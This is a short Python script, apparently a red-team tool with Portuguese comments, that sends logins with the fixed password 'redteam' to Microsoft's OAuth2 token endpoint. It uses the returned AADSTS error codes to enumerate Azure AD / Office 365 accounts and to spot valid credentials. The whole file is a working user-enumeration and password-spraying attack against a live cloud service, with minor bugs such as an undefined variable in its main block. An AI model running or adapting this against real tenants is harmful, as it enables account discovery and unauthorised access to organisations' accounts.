import requests
import json

def validate(user):

    url = "https://login.microsoft.com/"
    
    username = user.strip()

    body = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': "redteam",
        'scope': 'openid',
    }

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
    response = r.json()
    error = response["error_description"]
    if r.status_code == 200: 
        print(f"O Usuário {username} existe, e sua senha é: redteam")
        return(200)
    if "AADSTS50128" in error or "AADSTS50059" in error:
        return(error)
        #print(f"O Tenant do usuário {username} não existe. Verifique o domínio  para ter certeza que ele utiliza o Azure/O365")
    if "AADSTS50126" in error:
        return(error)
        #print(f"O usuário {username} pode existir.")
    if "AADSTS50034" in error:
        return(error)
        #print(f"O usuário {username} não existe.")
        #pass
    if "AADSTS50053" in error:
        # Locked out account or Smart Lockout in place
        #print(f"O usuário {username} está bloqueado")
        return(error)
    if "AADSTS50057" in error:
        # Disabled account
        return(error)
        print(f"O usário {username} está desabilitado")
if __name__=='__main__':
    validate(user)

    
    
